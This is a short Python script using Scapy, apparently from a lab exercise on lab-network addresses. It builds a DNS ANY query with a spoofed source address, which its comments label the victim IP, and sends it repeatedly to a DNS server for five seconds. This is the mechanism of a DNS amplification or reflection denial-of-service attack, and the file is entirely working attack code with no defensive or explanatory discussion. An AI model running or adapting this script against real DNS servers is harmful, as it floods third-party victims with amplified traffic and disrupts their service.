from scapy.all import *
import time

# Configuration Section
dns_server_ip = "10.9.0.53"        # IP address of the target DNS server
fake_source_ip = "10.9.0.5"        # Spoofed IP address (victim IP)
target_domain = "geeksforgeeks.org"  # Domain to be queried

# Construct a spoofed DNS ANY query packet
# - IP layer uses spoofed source IP and DNS server as destination
# - UDP uses a random source port and standard DNS port 53 as destination
# - DNS layer sets rd (recursion desired) and qtype 255 (ANY)
spoofed_dns_query = IP(src=fake_source_ip, dst=dns_server_ip) / \
                    UDP(sport=RandShort(), dport=53) / \
                    DNS(rd=1, qd=DNSQR(qname=target_domain, qtype=255))

# Send spoofed DNS queries for 5 seconds continuously
start_time = time.time()
while time.time() - start_time < 5:
    send(spoofed_dns_query, verbose=0)
